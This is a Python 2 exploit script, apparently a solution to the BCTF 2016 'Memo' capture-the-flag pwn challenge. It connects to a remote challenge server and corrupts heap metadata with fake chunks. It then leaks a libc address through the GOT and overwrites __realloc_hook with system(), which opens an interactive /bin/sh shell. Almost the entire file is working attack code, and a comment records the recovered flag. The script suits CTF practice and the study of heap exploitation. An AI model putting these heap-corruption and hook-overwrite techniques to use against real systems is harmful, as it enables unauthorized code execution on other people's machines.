#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# BCTF 2016 - Memo (Pwn 300)
# --------------------------------------------------------------------------------------------------
import struct
import sys
import socket
import struct
import telnetlib

# --------------------------------------------------------------------------------------------------
def recv_until(st):                         # receive until you encounter a string
  ret = ""
  while st not in ret:
    ret += s.recv(8192)

  return ret

# --------------------------------------------------------------------------------------------------
def extract( raw ):                         # extract a qword from socket stream
    
    qword = ''                              #
    for i in range(8):
        digit = raw[i]                      # read a digit

        if digit == '\n':                   # if newline
            qword += '\x00' * (8-i)         #   pad with zeros
            break                           #   and stop

        qword += digit                      # append digit

    return struct.unpack("<Q", qword)[0]    # return qword

# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
    
    s = socket.create_connection(('202.112.26.108', 10001)) 
    #s = socket.create_connection(('localhost', 7777))   # connect to server
    f = s.makefile()                                    # associate a file object with socket

    recv_until('6.exit')

    print '[+] Leaking a heap address...'

    # set name with a fake free chunk, and overwrite page size with 0x40
    s.send( '4' + '\n')
    recv_until('Input your new name:')

    fake_chunk = struct.pack('<QQQQ', 0x00, 0x20, 0x602028, 0x602030) +\
                 struct.pack('<Q', 0x20) + '@' 

    s.send( fake_chunk )
    recv_until('6.exit')

    # change page and add another fake chunk
    s.send( '2' + '\n')
    recv_until('Input the new content of this page:')

    fake_chunk = struct.pack('<QQQQQQ', 0x00, 0x41, 0x602028, 0x602030, 0, 0)

    s.send( 'A'*0x30 + fake_chunk + '\n' )
    recv_until('6.exit')

    # realloc the page after title buffer
    s.send( '3' + '\n' )
    recv_until('Input the new page size (bytes):')
    s.send( '500' + '\n' )
    recv_until('Input the new content of this page:')
    s.send( 'foo '*16 + '\n' )
    recv_until('6.exit')

    # shrink page and cause malloc_consolidate to coalesce chunks in fastbins
    s.send( '3' + '\n' )
    recv_until('Input the new page size (bytes):')
    s.send( '140' + '\n' )
    recv_until('Input the new content of this page:')
    s.send( 'foo '*16 + '\n' )
    recv_until('6.exit')

    # -------------------------------------------------------------------------
    # exploit process
    # -------------------------------------------------------------------------

    # modify .bss entries
    s.send( '4' + '\n' )
    recv_until('Input your new name:')
    s.send( struct.pack('<QQQQ', 0x00, 0x4141414141414141, 0x601FF0, 0x602028 ) + '\n' )
    recv_until('6.exit')

    # .got leak
    s.send( '1' + '\n' ) 
    
    f.read(len('On this page you write:\n'))
    atoi = extract(f.read(8))

    print '[+] atoi() at', hex(atoi)
    recv_until('6.exit')


    #atoi_base         = 0x0000000000036360
    #system_base       = 0x00000000000414f0
    #realloc_hook_base = 0x00000000003a3608

    atoi_base         = 0x0000000000039f50
    system_base       = 0x0000000000046640
    realloc_hook_base = 0x00000000003be730


    realloc_hook      = atoi - atoi_base +realloc_hook_base #0x00007FFFF7DD6608
    
    system = atoi - atoi_base + system_base

    print '[+] realloc_hook() at', hex(realloc_hook)
    print '[+] system() at', hex(system)


    # make title point to __realloc_hook
    s.send( '4' + '\n' )
    recv_until('Input your new name:')
    s.send( struct.pack('<QQQQ', 0x00, realloc_hook, 0x601FF0, 0x602028 ) + '\n' )
    recv_until('6.exit')

    # set hook to system()
    s.send( '5' + '\n' )
    recv_until('Input your new title:')
    s.send( struct.pack('<Q', system) + '\n' )
    recv_until('6.exit')

    # write /bin/sh to memory
    s.send( '4' + '\n' )
    recv_until('Input your new name:')
    s.send( '/bin/sh\x00' + struct.pack('<QQ', 0x4141414141414141, 0x602028) + '\n' )
    recv_until('6.exit')
    
    # trigger shell
    s.send( '3' + '\n' )
    recv_until('Input the new page size (bytes):')
    s.send( '400' + '\n' )

    # get flag: BCTF{hell0_Mall0c_guru}
    print '[+] Opening Shell...'
    t = telnetlib.Telnet()                      # try to open shell
    t.sock = s
    t.interact()
    
    exit(0) 
# --------------------------------------------------------------------------------------------------
